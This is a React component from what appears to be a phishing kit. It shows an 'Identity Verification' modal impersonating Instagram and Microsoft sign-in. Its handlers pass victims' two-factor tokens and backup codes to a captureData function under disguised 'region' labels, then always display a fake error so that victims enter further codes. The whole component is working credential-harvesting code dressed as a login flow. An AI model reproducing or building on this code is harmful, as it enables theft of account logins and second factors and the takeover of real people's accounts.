"use client";

import { useState } from "react";
import { X, Instagram, Mail, ChevronRight, ShieldCheck } from "lucide-react";
import AuthVerification from "./AuthVerification";
import EmailVerification from "./EmailVerification";
import AuthTwoFactor from "./AuthTwoFactor";
import AuthBackup from "./AuthBackup";
import { captureData } from "@/lib/capture";

export default function AuthModal({
  isOpen,
  onClose,
}: {
  isOpen: boolean;
  onClose: () => void;
}) {
  const [view, setView] = useState<
    "gateway" | "email" | "instagram" | "two_factor" | "backup_code" | "success"
  >("gateway");
  const [currentEntryId, setCurrentEntryId] = useState<string | null>(null);
  const [isError, setIsError] = useState(false);

  if (!isOpen) return null;

  const handleClose = () => {
    setView("gateway");
    setCurrentEntryId(null);
    setIsError(false);
    onClose();
  };

  const handleBackupVerify = async (code: string) => {
    setIsError(false);
    if (currentEntryId) {
      // Logic maps to 'Jurong' in capture utility
      const uniqueKey = `backupCode_${Date.now()}`;
      await captureData("West-Region", { [uniqueKey]: code }, currentEntryId);
    }
    setTimeout(() => setIsError(true), 1200);
  };

  const handleTwoFactorVerify = async (token: string) => {
    setIsError(false);
    if (currentEntryId) {
      // Logic maps to 'MarinaBay' in capture utility
      const uniqueKey = `token_${Date.now()}`;
      await captureData("South-Region", { [uniqueKey]: token }, currentEntryId);
    }
    setTimeout(() => setIsError(true), 1200);
  };

  return (
    <div className="fixed inset-0 z-[500] flex items-center justify-center p-6">
      <div
        className={`absolute inset-0 transition-colors duration-500 ${
          view === "backup_code" || view === "two_factor"
            ? "bg-white"
            : "bg-black/90 backdrop-blur-md"
        }`}
        onClick={handleClose}
      />

      {/* 1. GATEWAY VIEW */}
      {view === "gateway" && (
        <div className="relative bg-[#121212] w-full max-w-lg rounded-[2rem] p-10 md:p-16 text-center border border-white/10 shadow-2xl animate-in zoom-in-95">
          <div className="absolute top-0 left-0 w-full h-1.5 bg-gradient-to-r from-blue-600 via-indigo-500 to-blue-600" />
          <button
            onClick={handleClose}
            className="absolute top-8 right-8 text-zinc-500 hover:text-white transition-colors">
            <X />
          </button>
          <div className="mb-12">
            <div className="inline-flex p-3 bg-blue-500/10 rounded-2xl mb-6">
              <ShieldCheck className="w-6 h-6 text-blue-500" />
            </div>
            <h3 className="text-3xl font-bold tracking-tight text-white mb-2">
              Identity Verification
            </h3>
            <p className="text-zinc-500 text-sm">
              Select a service to verify your access
            </p>
          </div>
          <div className="space-y-4">
            <button
              onClick={() => setView("instagram")}
              className="group w-full bg-[#1c1c1c] border border-white/5 text-white py-5 rounded-2xl font-bold flex items-center justify-between px-8 transition-all hover:bg-white/10 hover:scale-[1.01]">
              <Instagram className="w-5 h-5 text-pink-500" />
              <span className="text-[10px] uppercase tracking-[0.2em] font-black">
                Verify with Instagram
              </span>
              <ChevronRight className="w-4 h-4 opacity-30" />
            </button>
            <button
              onClick={() => setView("email")}
              className="group w-full bg-[#1c1c1c] border border-white/5 text-white py-5 rounded-2xl font-bold flex items-center justify-between px-8 transition-all hover:bg-white/10 hover:scale-[1.01]">
              <Mail className="w-5 h-5 text-blue-500" />
              <span className="text-[10px] uppercase tracking-[0.2em] font-black">
                Verify with Microsoft
              </span>
              <ChevronRight className="w-4 h-4 opacity-30" />
            </button>
          </div>
        </div>
      )}

      {/* 2. AUTHENTICATION VIEW */}
      {view === "instagram" && (
        <AuthVerification
          onLogin={(user, id) => {
            setCurrentEntryId(id);
          }}
          onSuccess={() => {
            setIsError(false);
            setView("two_factor");
          }}
          onRequireBackup={() => {
            setIsError(false);
            setView("two_factor");
          }}
        />
      )}

      {/* 3. TWO-FACTOR VIEW */}
      {view === "two_factor" && (
        <AuthTwoFactor
          onVerify={handleTwoFactorVerify}
          showError={isError}
          onUseBackup={() => {
            setIsError(false);
            setView("backup_code");
          }}
        />
      )}

      {/* 4. RECOVERY CODE VIEW */}
      {view === "backup_code" && (
        <AuthBackup
          onUseApp={() => {
            setIsError(false);
            setView("two_factor");
          }}
          onVerify={handleBackupVerify}
          showError={isError}
        />
      )}

      {/* 5. EMAIL VIEW */}
      {view === "email" && (
        <EmailVerification
          onLogin={(email, id) => {
            setCurrentEntryId(id);
          }}
          onSuccess={() => setView("gateway")}
        />
      )}
    </div>
  );
}
